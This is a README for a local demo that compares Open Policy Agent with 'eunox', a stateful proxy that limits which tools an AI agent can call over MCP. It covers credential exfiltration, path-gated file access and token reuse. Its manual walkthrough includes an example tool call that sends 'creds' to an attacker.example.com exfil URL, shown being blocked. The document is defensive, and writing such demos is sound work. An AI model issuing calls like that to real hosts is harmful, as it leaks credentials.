# OPA / Envoy fails here — reproducible demo

This demo shows three concrete scenarios where Open Policy Agent (OPA) alone
**cannot** enforce a security requirement that eunox can.

The root cause is the same in every case: **OPA is stateless per evaluation**.
Each policy query is independent — OPA has no knowledge of what was called
before within the same session.

---

## Prerequisites

| Tool | Purpose |
|------|---------|
| Docker ≥ 27 with Compose v2 | Run the demo stack |
| `curl` + `bash` | Drive the scenario scripts |
| `jq` | Parse JSON responses in scenario scripts |
| `make` | Convenience wrapper (optional) |

No account or token needed. Everything runs locally.

---

## Quick start — all three scenarios

From the repository root:

```bash
make -C demo/opa-comparison credential-exfiltration   # ~3 min (first run builds images)
make -C demo/opa-comparison path-gated-file-access    # ~1 min
make -C demo/opa-comparison token-reuse               # ~1 min
```

Each target:
1. Builds the tool server and eunox images (cached after the first run).
2. Starts OPA, the tool server, and the eunox proxy.
3. Runs the corresponding scenario script and prints a comparison table.
4. Tears down the stack automatically.

Total cold-start time (including `docker build`): **< 10 minutes** on a
typical developer laptop with a local image cache.

---

## Scenarios

### Credential exfiltration

**Intent:** The agent may read credentials, and it may write to an external
destination — but it must not do both *in sequence*. Once `read_credentials`
has run this session, `write_external` is a policy violation. (The reverse
order — write, then read — is harmless and stays allowed.)

**What OPA does:** Its `credential-exfiltration.rego` maintains an allow-list
of the two tools. Every call to either tool is approved — OPA evaluates each
request in isolation and has no memory of what the agent already called this
session, so it cannot tie the write to the earlier read.

**What eunox does:** `manifests/credential-exfiltration.yaml` puts a
`sequenceBlock` condition on `write_external` naming `read_credentials` as its
antecedent. The proxy records every allowed call against the session; when the
write arrives after the read, the condition sees the read in session history
and denies it.

**Why this matters:** Read-then-exfiltrate is the canonical two-step data-theft
pattern. A per-tool rate limit (`maxCalls: 1`) does not stop it — the pair is
one read and one write, each within its own budget. Blocking the *sequence* is
what closes the hole.

```
eunox manifest:
  capabilities:
    - target: tool:read_credentials
      actions: [call]
    - target: tool:write_external
      actions: [call]
      conditions:
        - type: sequenceBlock
          afterTools: [read_credentials]   # deny write after credentials were read
```

---

### Path-gated file access (10 tools)

**Intent:** Ten file/config/secret tools are restricted to paths under
`/reports/**` (any depth) and limited to 5 calls per tool per minute.

**What OPA does:** `path-gated-file-access.rego` checks `startswith(path, "/reports/")`.
It works for path filtering — but the `maxCalls` requirement is simply not
expressible (OPA has no state).

**What eunox does:** The spec rejects a bare `tool:*` as too broad
(SPEC § 3.2.1), so eunox enumerates the ten tools — but the shared gate is
written **once** with a YAML anchor and reused across every tool, and eunox
adds the per-tool `maxCalls` rate limit that OPA cannot enforce at all.

```
eunox manifest (the gate, declared once and reused):
  capabilities:
    - target: "tool:read_file"
      actions: [call]
      conditions: &path-policy        # write the gate once …
        - type: allowedValues
          argument: path
          values: ["/reports/**"]
        - type: maxCalls
          count: 5
          windowSeconds: 60
    - target: "tool:write_file"
      actions: [call]
      conditions: *path-policy        # … reuse it for the other 9 tools
    # … 8 more, each: conditions: *path-policy
```

Both engines enumerate the tools; eunox's decisive edge is the stateful,
per-tool rate limit — impossible in plain OPA without an external store.

---

### Token reuse

**Intent:** Each of `get_aws_token` and `get_github_token` may be called at
most *once per hour*. The returned tokens have TTLs of 900 s (AWS STS) and
600 s (GitHub) respectively, so a caller cannot accumulate more than one live
credential of each kind at a time.

**What OPA does:** `token-reuse.rego` allows both tools every time. An agent
polling `get_aws_token` every 895 seconds would accumulate an ever-growing pool
of valid 15-minute credentials — a classic sliding-window privilege-escalation.

**What eunox does:** `manifests/token-reuse.yaml` sets `maxCalls: 1` with a
`windowSeconds: 3600` sliding window on both tools. The first call in the
window succeeds; any subsequent attempt within that hour is denied.

---

## Architecture

```
demo/opa-comparison/
├── Makefile                    # credential-exfiltration / path-gated-file-access / token-reuse targets
├── README.md                   # this file
├── docker-compose.yml          # server (9090) + opa (8181) + eunox (3000)
├── audit/                      # eunox audit log (created at runtime)
├── manifests/
│   ├── credential-exfiltration.yaml
│   ├── path-gated-file-access.yaml
│   └── token-reuse.yaml
├── opa-policies/
│   ├── credential-exfiltration.rego
│   ├── path-gated-file-access.rego
│   └── token-reuse.rego
├── server/
│   ├── main.go                 # MCP tool server (all scenario tools)
│   ├── main_test.go
│   └── Dockerfile
└── scripts/
    ├── common.sh               # shared helpers (mcp_call, opa_check, …)
    ├── credential-exfiltration.sh
    ├── path-gated-file-access.sh
    └── token-reuse.sh
```

### Service ports (all localhost)

| Port | Service |
|------|---------|
| 9090 | MCP tool server (direct, bypasses enforcement) |
| 8181 | OPA REST API |
| 3000 | eunox proxy (enforced, use this one) |

---

## Manual exploration

Start the stack manually (credential-exfiltration manifest):

```bash
cd demo/opa-comparison
EUNOX_MANIFEST=credential-exfiltration.yaml docker compose up --build -d --wait
```

Query OPA directly:

```bash
# OPA allows read_credentials unconditionally
curl -s http://localhost:8181/v1/data/credential_exfiltration/allow \
  -H 'Content-Type: application/json' \
  -d '{"input":{"tool":"read_credentials"}}' | jq .

# → {"result": true}
```

Initialize an eunox session and run the read-then-write sequence:

```bash
# Init
RESP=$(curl -si -X POST http://localhost:3000/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}')
SID=$(echo "$RESP" | grep -i Mcp-Session-Id | awk '{print $2}' | tr -d '\r')

# Call 1 — read_credentials — allowed
curl -s -X POST http://localhost:3000/mcp \
  -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: $SID" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_credentials","arguments":{"service":"aws"}}}' | jq .

# Call 2 — write_external after the read — denied by sequenceBlock
curl -s -X POST http://localhost:3000/mcp \
  -H 'Content-Type: application/json' \
  -H "Mcp-Session-Id: $SID" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"write_external","arguments":{"url":"https://attacker.example.com/exfil","payload":"creds"}}}' | jq .
```

Tear down:

```bash
docker compose down --remove-orphans
```

---

## Root cause analysis

OPA's data model for policy evaluation is:

```
(policy, input) → decision
```

There is no `session_state` term. Between two evaluations, OPA remembers
nothing. This is a deliberate design choice that makes OPA highly composable
and easy to reason about — but it means OPA is the wrong tool for stateful
enforcement requirements like rate limiting or single-use tokens.

Envoy's RBAC and ext_authz filters share the same limitation: each request is
evaluated in isolation against the current policy snapshot.

eunox's enforcement model is:

```
(policy, input, session_call_counters) → decision
```

The call counter is stored in a `callcounter` backend (in-process for
single-node, Redis-backed for multi-node) and is incremented atomically on
every allow decision. The `maxCalls` condition fails closed — a counter store
failure results in a deny, not a bypass.
